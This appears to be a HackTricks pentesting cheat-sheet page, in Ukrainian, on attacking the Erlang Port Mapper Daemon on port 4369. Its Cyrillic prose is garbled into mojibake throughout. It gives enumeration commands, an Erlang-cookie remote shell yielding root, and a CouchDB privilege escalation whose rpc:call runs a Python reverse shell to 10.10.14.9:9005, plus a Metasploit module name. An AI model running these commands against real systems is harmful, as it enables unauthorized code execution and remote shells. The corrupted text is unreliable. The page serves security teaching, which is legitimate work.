{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

**Erlang Port Mapper Daemon (epmd)** —Å–ª—É–≥—É—î –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–æ—Ä–æ–º –¥–ª—è —Ä–æ–∑–ø–æ–¥—ñ–ª–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ Erlang. –í—ñ–Ω –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å–∏–º–≤–æ–ª—ñ—á–Ω–∏—Ö —ñ–º–µ–Ω –≤—É–∑–ª—ñ–≤ –Ω–∞ –∞–¥—Ä–µ—Å–∏ –º–∞—à–∏–Ω, —Ñ–∞–∫—Ç–∏—á–Ω–æ –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏, —â–æ–± –∫–æ–∂–Ω–µ —ñ–º'—è –≤—É–∑–ª–∞ –±—É–ª–æ –ø–æ–≤'—è–∑–∞–Ω–µ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—é –∞–¥—Ä–µ—Å–æ—é. –¶—è —Ä–æ–ª—å **epmd** —î –∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–æ—é –¥–ª—è –±–µ–∑–ø–µ—Ä–µ–±—ñ–π–Ω–æ—ó –≤–∑–∞—î–º–æ–¥—ñ—ó —Ç–∞ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –º—ñ–∂ —Ä—ñ–∑–Ω–∏–º–∏ –≤—É–∑–ª–∞–º–∏ Erlang —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
–¶–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∞—Ö RabbitMQ —Ç–∞ CouchDB.

# –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

## –í—Ä—É—á–Ω—É
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## Remote Connection

–Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–≤–∏—Ç—è–≥–Ω—É—Ç–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π–Ω–µ –ø–µ—á–∏–≤–æ**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ –Ω–∞ —Ö–æ—Å—Ç—ñ. –ó–∞–∑–≤–∏—á–∞–π —Ü–µ –ø–µ—á–∏–≤–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `~/.erlang.cookie` —ñ –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è erlang –ø—ñ–¥ —á–∞—Å –ø–µ—Ä—à–æ–≥–æ –∑–∞–ø—É—Å–∫—É. –Ø–∫—â–æ –π–æ–≥–æ –Ω–µ –∑–º—ñ–Ω—é–≤–∞–ª–∏ –∞–±–æ –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞–ª–∏ –≤—Ä—É—á–Ω—É, —Ü–µ –≤–∏–ø–∞–¥–∫–æ–≤–∏–π —Ä—è–¥–æ–∫ \[A:Z] –¥–æ–≤–∂–∏–Ω–æ—é 20 —Å–∏–º–≤–æ–ª—ñ–≤.
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–∞ [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)\
–ê–≤—Ç–æ—Ä —Ç–∞–∫–æ–∂ –¥—ñ–ª–∏—Ç—å—Å—è –ø—Ä–æ–≥—Ä–∞–º–æ—é –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –∫—É–∫–∏:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## –õ–æ–∫–∞–ª—å–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –±—É–¥–µ–º–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ CouchDB –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –ª–æ–∫–∞–ª—å–Ω–æ:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
–ü—Ä–∏–∫–ª–∞–¥ –≤–∑—è—Ç–∏–π –∑ [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)\
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **Canape HTB machine to** **practice** —è–∫ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å**.

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "–Ω–∞ –ø–æ—Ä—Ç—É"`


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
